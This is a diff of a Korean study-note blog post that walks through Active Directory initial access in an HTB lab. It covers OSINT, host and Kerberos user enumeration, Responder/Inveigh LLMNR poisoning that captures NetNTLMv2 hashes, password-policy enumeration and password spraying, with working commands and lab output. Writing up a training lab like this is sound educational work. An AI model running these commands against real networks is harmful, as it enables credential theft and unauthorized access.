@@ -2,33 +2,37 @@
 title: "Active Directory - Initial Enumeration and Foothold"
 date: 2026-08-02
 layout: single
-excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
+excerpt: "Active Directory 환경에서 외부 정찰과 내부 호스트, 사용자 열거를 수행하고, Responder와 Inveigh를 이용한 LLMNR/NBT-NS 포이즈닝, 비밀번호 정책 확인 및 패스워드 스프레이를 통해 초기 foothold를 확보하는 과정을 정리한다."
 author_profile: true
 toc: true
 toc_label: "Active Directory"
 toc_icon: "book"
 toc_sticky: true
 categories: [cpts-infra]
-tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
-
-published: false
+tags: [cpts, active-directory, enumeration, responder, password-spraying]
 ---
+
+Active Directory 환경에서 외부 정찰과 내부 호스트, 사용자 열거를 수행하고, Responder와 Inveigh를 이용한 LLMNR/NBT-NS 포이즈닝, 비밀번호 정책 확인 및 패스워드 스프레이를 통해 초기 foothold를 확보하는 과정을 정리한다.
 
 # Initial Enumeration
 
 ## External Recon and Enumeration Principles
 
-초반에 접근을 하기 위해 도메인 열거는 필수이다.
+### Public OSINT and Infrastructure Enumeration
 
-[Hurricane Electric](https://bgp.he.net/) 와 같은 사이트나, [](https://viewdns.info/) 사이트를 이용하여 도메인의 열거를 수행하는데 도움이 된다.
+초기 접근 지점을 찾기 위해서는 대상 도메인과 외부 노출 정보를 먼저 열거하는 과정이 중요하다.
 
-도메인에 각각 txt, 도메인의 ip, 각 연결된 하위 도메인 정보들이 들어있을수도 있기 때문이다.
+[Hurricane Electric](https://bgp.he.net/) 또는 [ViewDNS](https://viewdns.info/) 같은 서비스를 활용하면 대상 도메인과 연관된 네트워크 및 DNS 정보를 확인하는 데 도움이 된다.
 
-만약 inlanefreight.com 도메인을 검색한다고 가정해보자.
+이 과정에서 도메인의 IP 대역, DNS 레코드, 하위 도메인 등 추가 공격 표면으로 이어질 수 있는 정보를 확보할 수 있기 때문이다.
 
-그렇다면 구글을 통하여 "filetype:pdf inurl:inlanefreight.com" 식으로 구글의 세부 명령을 통하여 열거를 진행할수도 잇으며
+예를 들어 `inlanefreight.com` 도메인을 조사한다고 가정해보자.
 
-또한 [](https://dehashed.com/) 도구를 사용하여 유출된 데이터에서 평문 자격 증명과 암호 해시를 찾는 데 열거를 진행할수도있다:
+Google에서 `filetype:pdf inurl:inlanefreight.com` 과 같은 검색 연산자를 사용하면 대상 도메인과 관련된 공개 문서를 추가로 찾을 수 있다.
+
+### Credential Leak Search
+
+또한 [DeHashed](https://dehashed.com/) 같은 유출 데이터 검색 서비스를 활용하여 공개적으로 유출된 이메일, 사용자명, 평문 비밀번호 또는 비밀번호 해시가 존재하는지도 확인할 수 있다:
 
 ```bash
 $ sudo python3 dehashed.py -q inlanefreight.local -p
@@ -60,7 +64,7 @@ database_name : MyFitnessPal
 
 ## Initial Enumeration of the Domain
 
-현재 침투테스트에서 얻은 정보는 다음과 같다:
+현재 침투 테스트에서 제공된 정보는 다음과 같다:
 
 - Scope: 172.16.5.0/23
 - 내부망에 배치된 Linux pentest VM
@@ -69,9 +73,11 @@ database_name : MyFitnessPal
 - Grey Box
 - Non-Evasive
 
-따라서 htb-student 계정으로 들어가 듀얼 홈드 환경에서의 사용자 열거나 시스템에 접근할수 있는 권한을 찾아야한다.
+따라서 제공된 htb-student 계정과 공격 호스트를 기반으로 내부 네트워크를 열거하고, 접근 가능한 시스템과 사용자 정보를 찾아야 한다.
 
-ifconfig 를 보면 이처럼 현재 호스트에 172.16.5.0/23 호스트가 붙은걸 확인할수있따:
+### Network Interface and Scope
+
+`ifconfig` 를 확인하면 현재 Linux 공격 호스트가 두 개의 네트워크 인터페이스에 연결된 듀얼 홈드(Dual-Homed) 환경임을 확인할 수 있다:
 
 ```bash
 $ ifconfig
@@ -96,11 +102,13 @@ ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-이처럼 현재 다른 홉의 연결되어 게이트웨이를 통해 통신하는 호스트 들이 아닌
+`ens224` 인터페이스는 `172.16.4.0/23` 네트워크에 직접 연결되어 있다.
 
-듀얼 홈드로 연결되어있는 환경이기에 tcpdump, wireshark 와 같은 통신 패킷 흐름을 캡쳐하는 도구를 활용하여 ens224의 흐름을 확인할수있게된다.
+따라서 별도의 라우팅 홉을 거쳐 접근하는 구조와 달리, 같은 로컬 네트워크에서 발생하는 브로드캐스트/멀티캐스트 기반 트래픽을 `tcpdump`, `Wireshark` 같은 도구로 관찰할 수 있다.
 
-또한 `172.16.5.0/23` 처럼 현재 광범위한 스코프이기에 fping 명령을 통하여 각각 어떤 호스트가 존재하는지를 확인할수 있다:
+### Host Discovery and Service Enumeration
+
+또한 제공된 범위가 `/23` 이므로, 해당 CIDR의 실제 네트워크 주소인 `172.16.4.0/23` 을 대상으로 `fping` 을 사용해 응답하는 호스트를 빠르게 확인할 수 있다:
 
 ```bash
 $ fping -asgq 172.16.4.0/23   
@@ -110,7 +118,7 @@ $ fping -asgq 172.16.4.0/23
 172.16.5.225
 ```
 
-또한 각각 출력된 호스트를 토대로 txt 파일을 만들어 각 nmap에 끼어넣을수있게된다:
+응답한 호스트를 `hosts.txt` 에 저장한 뒤 `nmap -iL` 을 사용하면 여러 호스트를 한 번에 서비스 스캔할 수 있다:
 
 ```bash
 $ sudo nmap -sC -sV -iL hosts.txt | tee nmap                                                                   
@@ -179,9 +187,11 @@ Nmap scan report for 172.16.5.130
 # SKIP
 ```
 
-이처럼 현재 172 안에서도 각각 다른 서버들이며, 특히 172.16.5.5 포트에선 AD를 사용하는 서버임을 알수있게된다.
+스캔 결과 여러 내부 호스트가 확인되었으며, 특히 `172.16.5.5` 에서는 DNS, Kerberos, LDAP, SMB, Global Catalog 등의 포트가 열려 있어 Active Directory Domain Controller임을 추정할 수 있다.
 
-이를 통하여 [kerbrute](https://github.com/ropnop/kerbrute) 를 통하여 사용자 열거를 진행할수있따:
+### Kerberos User Enumeration
+
+확인한 도메인 `INLANEFREIGHT.LOCAL` 과 KDC `172.16.5.5` 를 기준으로 [Kerbrute](https://github.com/ropnop/kerbrute)를 사용해 유효한 사용자명을 열거할 수 있다:
 
 ```bash
 $ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt
@@ -206,17 +216,19 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:366b80789ff06d382993e4766a0f2c84$8340e
 2026/08/02 01:35:58 >  [+] VALID USERNAME:       jsantiago@INLANEFREIGHT.LOCAL
 ```
 
-이제 이 결과를 바탕으로 표적 암호 무차별 대입 공격에 사용할 목록을 만들 수 있습니다.
+이 결과를 통해 유효한 사용자 목록을 확보할 수 있으며, 이후 AS-REP Roasting이나 패스워드 스프레이처럼 계정 목록이 필요한 단계에 활용할 수 있다.
 
 # Sniffing out a Foothold
 
 ## LLMNR/NBT-NS Poisoning - from Linux
 
-라우팅을 안거치고 네트워크 안의 랜에 같이 존재하기에 responder 툴을 이용하여 내부 172.16.5의 패킷들을 캡쳐할수 있게된다.
+### Capturing NetNTLMv2 with Responder
 
-responder툴은 이름 해석 요청을 가로채서 내가 그 서버라고 속이고 상대 인증을 받아내는 툴이다.
+현재 공격 호스트가 내부 네트워크에 직접 연결되어 있으므로, Responder를 이용해 LLMNR/NBT-NS/mDNS 이름 해석 요청을 관찰하고 잘못된 이름 해석 요청에 응답할 수 있다.
 
-따라서 responder를 키게되면 이처럼 각 172.16.5단의 각 서버들이 이름을 찾고 responer는 응답을 수신하며 172.16.5단 서버는 속아서 responder에게 전달하게 되는 구조가 되게된다:
+Responder는 피해 호스트의 이름 해석 요청에 공격자 호스트가 해당 시스템인 것처럼 응답한 뒤, SMB, HTTP, MSSQL 등의 인증 시도를 유도하여 NetNTLMv2 Challenge-Response 값을 캡처하는 도구이다.
+
+따라서 `ens224` 에서 Responder를 실행하면 내부 호스트가 존재하지 않거나 잘못된 이름을 조회할 때 Poisoning 응답을 보내고, 이후 공격자 서비스로 전달되는 인증 시도를 확인할 수 있다:
 
 ```bash
 $ sudo responder -I ens224                                                                                     
@@ -253,9 +265,11 @@ $ sudo responder -I ens224
 [MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:8c91d150859b691a:A70CF89062A865E43F4AAF55B4D0209A:01010000000000004ECBC92FE62ADD01678508CE7C4E0B2600000000020008004D0032004800310001001E00570049004E002D0057004200530032004300330056004E004B0055005000040014004D003200480031002E004C004F00430041004C0003003400570049004E002D0057004200530032004300330056004E004B00550050002E004D003200480031002E004C004F00430041004C00050014004D003200480031002E004C004F00430041004C000800300030000000000000000000000000300000DECFE5882AAA3D0E9CB0F305131DA75C12513B952F999AD8C47C62CEECC87B330A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000
 ```
 
-이처럼 mssql 서버로 들어가려던 사람이 academy-ea-web0:1433 MSSQL에 접속해야지 하다가 responder에게 속아 위처럼 lab_adm의 자격증명이 나타난것을 확인할수있따.
+출력에서는 `172.16.5.130` 호스트가 `academy-ea-web0` 을 찾는 과정에서 Responder의 Poisoning 응답을 받아 MSSQL 인증을 시도했고, 그 결과 `lab_adm` 계정의 NetNTLMv2 Challenge-Response 값이 캡처된 것을 확인할 수 있다.
 
-또한 찍히진 않았지만 `wley` 도 발견되어 계정 비번을 크랙하여 이처럼 내부에 사용할수있게된다:
+### Validating Recovered Credentials
+
+별도로 캡쳐된 `wley` 의 값을 크랙하여 다음 자격 증명을 확보하였다:
 
 ```bash
 $ crackmapexec smb 172.16.5.0/24 -u wley -p 'transporter@4'
@@ -264,7 +278,7 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4
 ```
 
-접속할수있따:
+확보한 자격 증명으로 SMB 인증도 확인할 수 있다:
 
 ```bash
 $ smbclient -L //172.16.5.5 -U 'INLANEFREIGHT.LOCAL\wley%transporter@4'                                        
@@ -283,9 +297,11 @@ $ smbclient -L //172.16.5.5 -U 'INLANEFREIGHT.LOCAL\wley%transporter@4'
 
 ## LLMNR/NBT-NS Poisoning - from Windows
 
-윈도우의 사용법은 이러하다.
+### Capturing NetNTLMv2 with Inveigh
 
-우선 내부 네트워크 구조를 보니 이러하다:
+Windows 환경에서도 동일한 이름 해석 Poisoning 공격 흐름을 확인할 수 있다.
+
+우선 네트워크 인터페이스를 확인하면 다음과 같다:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\htb-student\Documents> ipconfig
@@ -312,11 +328,11 @@ Ethernet adapter Ethernet0:
                                        10.129.0.1
 ```
 
-이처럼 윈도우 환경에도 리눅스 환경이랑 비슷하게 되어있다.
+Windows 공격 호스트 역시 `10.129.0.0/16` 과 `172.16.4.0/23` 측에 연결된 듀얼 홈드 환경임을 확인할 수 있다.
 
-윈도우에선 리눅스의 리스폰더와 비슷한 C# Inveigh 도구가 존재한다.
+Windows에서는 Responder와 유사한 기능을 제공하는 C# 기반 Inveigh를 사용할 수 있다.
 
-쓰면 이렇게된다:
+Inveigh를 실행하면 다음과 같이 LLMNR 요청과 SMB 인증 시도를 확인할 수 있다:
 
 ```powershell
 *Evil-WinRM* PS C:\tools> .\Inveigh.exe
@@ -334,7 +350,7 @@ Ethernet adapter Ethernet0:
 lab_adm::INLANEFREIGHT:E2F1B67656CD23A8:E3D4D4E0A0EB96CE5B1C330AB0E637A1:01010000000000001D39010DF22ADD01FB3AF0502925BFB90000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001D39010DF22ADD0106000400020000000800300030000000000000000000000000300000345E64B92F0BAD3BB5C7F2D001EFF7D6094A9BB17BDEEFD13F6446B0C1DED0CD0A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
 ```
 
-이처럼 나오게된다.
+이처럼 Windows 환경에서도 이름 해석 요청을 Poisoning하여 NetNTLMv2 Challenge-Response 값을 캡처할 수 있다.
 
 # Sighting In, Hunting For A User
 
@@ -342,11 +358,13 @@ lab_adm::INLANEFREIGHT:E2F1B67656CD23A8:E3D4D4E0A0EB96CE5B1C330AB0E637A1:0101000
 
 ### Linux
 
-우선 패스워드 스프레이를 하기전 상대 서버의 패스워드 정책을 훑어보는것이 좋다.
+패스워드 스프레이를 수행하기 전에는 먼저 도메인의 비밀번호 및 계정 잠금 정책을 확인하는 것이 중요하다.
 
-그래야 거기에 맞춰서 패스워드 스프레이를 진행할수가 있기 때문이다.
+특히 Lockout Threshold와 Observation Window를 확인해야 여러 계정에 동일한 비밀번호를 시도할 때 계정 잠금 위험을 줄일 수 있다.
 
-nxc를 활용하여 볼수가 있다:
+#### NetExec / CrackMapExec
+
+Linux에서는 NetExec/CrackMapExec의 `--pass-pol` 옵션을 사용하여 정책을 확인할 수 있다:
 
 ```bash
 $ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol                                            
@@ -373,11 +391,13 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set
 ```
 
-이처럼 5번에 실패하면 30분간 계쩡 로그인이 불가능하고, 최소 비밀번호가 8자임을 확인할수있고
+출력에서 최소 비밀번호 길이는 8자이며, 잘못된 인증이 5회 누적되면 계정이 잠기고 잠금 시간과 카운터 초기화 시간은 각각 30분으로 설정되어 있음을 확인할 수 있다.
 
-또한 이전에 사용했던 비밀번호 24개를 기억하고 그 24개 내에 비밀번호 재사용을 금지하고있다.
+또한 비밀번호 기록 길이가 24이므로 새 비밀번호는 이전 24개의 비밀번호와 동일하게 설정할 수 없다.
 
-또한 rpc를 활용하여도 어떤 도메인지와, 유저수가 몇마리인지, 비밀번호 정책을 가져올수가있다:
+#### RPCClient
+
+RPC를 사용할 수 있는 경우 `querydominfo` 와 `getdompwinfo` 를 통해 도메인 정보와 비밀번호 정책도 확인할 수 있다:
 
 ```bash
 rpcclient $> querydominfo
@@ -401,7 +421,9 @@ password_properties: 0x00000001
     DOMAIN_PASSWORD_COMPLEX
 ```
 
-그리고 [](https://github.com/cddmp/enum4linux-ng)를 이용하여 가져올수도있다:
+#### enum4linux-ng
+
+또한 [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)를 사용하면 SMB/RPC 정보와 비밀번호 정책을 한 번에 열거할 수 있다:
 
 ```bash
 $ enum4linux-ng -P 172.16.5.5 -oA ilfreight                                                                    
@@ -486,9 +508,11 @@ domain_logoff_information:
   force_logoff_time: not set 
 ```
 
-이처럼 내부에 어떤 도메인이 존재하는지와, 어떤 DC01 이름을 사용하는지, 또한 RPC의 널 세션이허용되는지 추가로 비밀번호 정책까지 가져올수 있게된다.
+이를 통해 도메인 이름, DC 호스트명, 익명 RPC 세션 허용 여부와 비밀번호 정책까지 함께 확인할 수 있다.
 
-또한 LADPSEARCH를 통하여 가져올수있다:
+#### LDAPSearch
+
+익명 LDAP 조회가 허용되는 환경이라면 `ldapsearch` 를 이용해서도 도메인 객체의 비밀번호 정책 속성을 확인할 수 있다:
 
 ```bash
 $ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength   
@@ -508,7 +532,9 @@ pwdHistoryLength: 24
 
 ### Window
 
-윈도우 환경에선 `net.exe` 를 사용하여 비밀번호 정책을 가져올수있다:
+#### net accounts
+
+Windows 환경에서는 `net accounts` 명령을 사용하여 현재 도메인/시스템에 적용되는 계정 정책을 확인할 수 있다:
 
 ```powershell
 C:\htb> net accounts
@@ -525,7 +551,9 @@ Computer role:                                        SERVER
 The command completed successfully.
 ```
 
-그리고 [powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)를 통해서도 가져올수도 있다:
+#### PowerView
+
+그리고 [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)의 `Get-DomainPolicy` 를 통해서도 Default Domain Policy에 설정된 비밀번호 및 Kerberos 정책을 확인할 수 있다:
 
 ```powershell
 PS C:\htb> import-module .\PowerView.ps1
@@ -548,9 +576,9 @@ GPODisplayName : Default Domain Policy
 
 ## Password Spraying - Making a Target User List
 
-패스워드 스프레이를 하기 전, 어떤 유저들이 존재하는지 확인해할 필요가 있다.
+패스워드 스프레이를 수행하기 전에는 어떤 사용자가 존재하는지 확인할 필요가 있다.
 
-우선 enillinux 툴을 활용하여 이렇게 유저들을 가져올수있따:
+우선 `enum4linux-ng` 를 사용하여 사용자명을 추출할 수 있다:
 
 ```bash
 $ enum4linux-ng -U 172.16.5.5 | grep "username:" | awk '{print $2}'   
@@ -565,7 +593,7 @@ lbradford
 # SKIP
 ```
 
-그리고 NULL 세션을 이용한 RPC로도 가져올수있다:
+NULL Session이 허용된 경우에는 `rpcclient` 를 사용해 익명으로 도메인 사용자 목록을 열거할 수도 있다:
 
 ```bash
 $ rpcclient -U "" -N 172.16.5.5
@@ -581,7 +609,7 @@ user:[avazquez] rid:[0x458]
 # SKIP
 ```
 
-또한 익명으로 ldapsearch를 활용하여 가져올수도 있다:
+익명 LDAP 바인딩과 검색이 허용된다면 `ldapsearch` 를 사용하여 `sAMAccountName` 도 수집할 수 있다:
 
 ```bash
 $ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
@@ -601,19 +629,19 @@ wdillard
 
 ## Internal Password Spraying - from Linux
 
-만약 이제 초기에 wely 계정인 transporter@4 라는 계정이 있었다.
+초기 정보 수집 과정에서 `transporter@4` 라는 비밀번호 문자열을 발견했지만, 어느 사용자의 비밀번호인지는 모르는 상황을 가정해보자.
 
-만약 그 계정에서 wely 유저의 계정인지 모르는 상태에서 어떠한 파일중 Password:transporter@4 라는게 적혀있었다고 가정해보자.
+이 경우 동일한 비밀번호를 다수의 유효한 사용자에게 한 번씩 시도하는 패스워드 스프레이를 통해 해당 비밀번호를 사용하는 계정을 찾을 수 있다.
 
-우선 방금의 방식을 활용하여 User를 txt 파일로 저장하였다:
+우선 앞서 사용한 방식으로 사용자 목록을 `users.txt` 에 저장한다:
 
 ```bash
 $ enum4linux-ng -U 172.16.5.5 | grep "username:" | awk '{print $2}' > users.txt
 ```
 
-이제 이 상태에서 `transporter@4` 라는 정보를 이용하여 패스워드 스프레이를 조져볼것이다.
+이제 `transporter@4` 를 사용자 목록 전체에 한 번씩 시도한다.
 
-따라서 내부에 이렇게작성하였다:
+다음과 같이 SMB 인증을 기준으로 패스워드 스프레이를 수행할 수 있다:
 
 ```bash
 $ crackmapexec smb 172.16.5.0/23 -u users.txt -p 'transporter@4'
@@ -625,19 +653,19 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [-] INLANEFREIGHT.LOCAL\jher
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 
 ```
 
-그렇다면 이처럼 `wley:transporter@4 ` 가뜨며 패스워드 스프레이에 성공하게된다.
+결과에서 `wley:transporter@4` 조합이 성공하여 `wley` 계정이 해당 비밀번호를 사용하고 있음을 확인할 수 있다.
 
-또한 저 계정이 wley 만 아닌 다른 유저들도 사용할수가 있기에 저기에만 그치지말고 쭉 열거해보는게 좋다.
+하나의 계정에서 성공했다고 바로 중단하기보다, 동일한 비밀번호를 다른 사용자도 재사용하고 있을 수 있으므로 범위 내 계정을 계속 확인할 수 있다.
 
-그리고 방금봤던 패스워드 정책에 따라서 
+단, 앞서 확인한 정책의 Lockout Threshold가 5이고 Observation Window가 30분이므로 반복적인 스프레이를 수행할 때는 잠금 임계값을 넘지 않도록 시도 횟수와 간격을 조절해야 한다.
 
 ## Internal Password Spraying - from Windows
 
-윈도우도 똑같다. 
+Windows에서도 기본 원리는 동일하다.
 
-윈도우에는 [passwordspary](https://github.com/dafthack/DomainPasswordSpray) 라는 툴이 존재한다.
+Windows에서는 [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) 스크립트를 사용하여 도메인 사용자에 대한 패스워드 스프레이를 수행할 수 있다.
 
-따라서 위 툴을 활용하여 패스워드 스프레이가 가능하다:
+예를 들어 다음과 같이 특정 비밀번호를 도메인 사용자에게 시도하고 성공한 계정을 파일로 저장할 수 있다:
 
 ```bash
 PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
